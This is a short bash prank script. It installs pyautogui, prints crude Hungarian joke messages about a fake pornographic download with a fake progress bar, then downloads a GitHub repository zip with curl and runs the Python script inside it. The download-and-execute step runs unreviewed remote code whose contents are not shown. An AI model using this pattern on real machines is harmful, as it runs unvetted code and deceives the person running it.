#!/bin/bash

#Download pyautogui is not installed
echo "Installing pyautogui if not installed"
python3 -m pip install pyautogui
sleep 1

echo "10 TB kecske porno letoltese folyamatban"

for i in 10 20 30 40 50 60 70 80 90 100
do
  echo "Loading ..... $i%"
done

echo "10 TB kecske porno sikeresen letoltodott"

echo "Downloading compressed content"

curl -LJo loczylevi-zsolti-projekt-py.zip https://api.github.com/repos/loczylevi/zsolti-projekt-py/zipball/main
sleep 1
                                      
# Unzip contents
echo "Unzipping compressed files"
unzip loczylevi-zsolti-projekt-py.zip
cd "$(ls | grep -v loczylevi-zsolti-projekt-py.zip | grep loczylevi)"
sleep 0.5

echo "Python script running..."
python3 holding_key.py
